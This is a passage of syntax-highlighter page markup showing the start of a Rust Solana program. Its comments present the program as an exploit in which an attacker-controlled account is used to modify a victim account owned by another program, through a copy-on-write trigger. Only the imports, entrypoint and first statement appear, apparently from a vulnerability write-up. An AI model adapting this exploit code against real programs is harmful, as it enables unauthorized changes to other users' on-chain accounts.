token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[2]}],[\"$\",\"span\",\"code-segement8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    ptr\"]}],[\"$\",\"span\",\"code-segement9\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[3]}],[\"$\",\"span\",\"code-segement12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    mem\"]}],[\"$\",\"span\",\"code-segement13\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement14\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--4\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[4]}],[\"$\",\"span\",\"code-segement16\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement17\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"rc\"]}],[\"$\",\"span\",\"code-segement18\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement19\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Rc\"]}],[\"$\",\"span\",\"code-segement20\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[5]}],[\"$\",\"span\",\"code-segement23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement24\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"cell\"]}],[\"$\",\"span\",\"code-segement25\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement26\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"RefCell\"]}],[\"$\",\"span\",\"code-segement27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[6]}],[\"$\",\"span\",\"code-segement30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement32\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement33\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[7]}],[\"$\",\"span\",\"code-segement35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement36\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"use\"]}],[\"$\",\"span\",\"code-segement37\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement38\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"solana_program\"]}],[\"$\",\"span\",\"code-segement39\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement40\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement41\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[8]}],[\"$\",\"span\",\"code-segement43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement44\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"account_info\"]}],[\"$\",\"span\",\"code-segement45\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement46\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}],[\"$\",\"span\",\"code-segement47\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement48\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[9]}],[\"$\",\"span\",\"code-segement50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement51\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"instruction\"]}],[\"$\",\"span\",\"code-segement52\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement53\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[10]}],[\"$\",\"span\",\"code-segement56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountMeta\"]}],[\"$\",\"span\",\"code-segement58\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement59\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--11\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[11]}],[\"$\",\"span\",\"code-segement61\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement62\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Instruction\"]}],[\"$\",\"span\",\"code-segement63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--12\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[12]}],[\"$\",\"span\",\"code-segement66\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement67\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--13\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[13]}],[\"$\",\"span\",\"code-segement71\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement72\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"program\"]}],[\"$\",\"span\",\"code-segement73\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement74\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"invoke_signed\"]}],[\"$\",\"span\",\"code-segement75\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement76\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--14\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[14]}],[\"$\",\"span\",\"code-segement78\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement79\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"entrypoint\"]}],[\"$\",\"span\",\"code-segement80\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement81\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement82\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--15\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement84\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement85\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"self\"]}],[\"$\",\"span\",\"code-segement86\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement87\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement89\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}],[\"$\",\"span\",\"code-segement90\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}],[\"$\",\"span\",\"code-segement91\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement92\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement94\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement95\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement96\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement97\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement99\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement100\",{\"className\":\"token token\",\"style\":{\"color\":\"#e2777a\"},\"children\":[\"pubkey\"]}],[\"$\",\"span\",\"code-segement101\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[20]}],\"\\n\",[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"token token macro\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"entrypoint!\"]}],[\"$\",\"span\",\"code-segement115\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"process_instruction\"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[22]}],\"\\n\",[\"$\",\"span\",\"line-number--23\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[23]}],\"\\n\",[\"$\",\"span\",\"line-number--24\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[24]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[0] : LEVERAGE account controlled by ATTACKER and owned by EXPLOIT program \"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--25\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[25]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement130\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[1] : VICTIM account ATTACKER wants to modify\"]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--26\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[26]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// accounts[2] : BENIGN program that owns VICTIM account ATTACKER wants to modify\"]}],[\"$\",\"span\",\"code-segement135\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--27\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[27]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segement139\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"fn\"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"token token function-definition\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"process_instruction\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--28\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[28]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _program_id\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement148\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement149\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement150\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segement151\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement152\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--29\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[29]}],[\"$\",\"span\",\"code-segement154\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}],[\"$\",\"span\",\"code-segement155\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement156\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement157\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement158\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement159\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}],[\"$\",\"span\",\"code-segement160\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement161\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement162\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--30\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[30]}],[\"$\",\"span\",\"code-segement164\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _instruction_data\"]}],[\"$\",\"span\",\"code-segement165\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement166\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement167\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segement168\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement169\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u8\"]}],[\"$\",\"span\",\"code-segement170\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement171\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segement172\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--31\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[31]}],[\"$\",\"span\",\"code-segement174\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement175\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement176\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement177\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}],[\"$\",\"span\",\"code-segement178\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement179\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"ProgramResult\"]}],[\"$\",\"span\",\"code-segement180\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segement181\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segement182\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[32]}],\"\\n\",[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[33]}],[\"$\",\"span\",\"code-segement186\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement187\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// trigger CoW here to prevent future issues\"]}],[\"$\",\"span\",\"code-segement188\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\"},\"children\":[34]}],[\"$\",\"span\",\"code-segement190\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    accounts\"]}],[\"$\",\"span\",\"code-segement191\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement192\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}],[\"$\",\"span\",\"code-segement193\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement194\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement195\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"data\"]}],[\"$\",\"span\",\"code-segement196\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}],[\"$\",\"span\",\"code-segement197\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"borrow_mut\"]}],[\"$\",\"span\",\"code-segement198\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement199\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement200\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segement201\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"10\"]}],[\"$\",\"span\",\"code-segement202\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segement203\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" 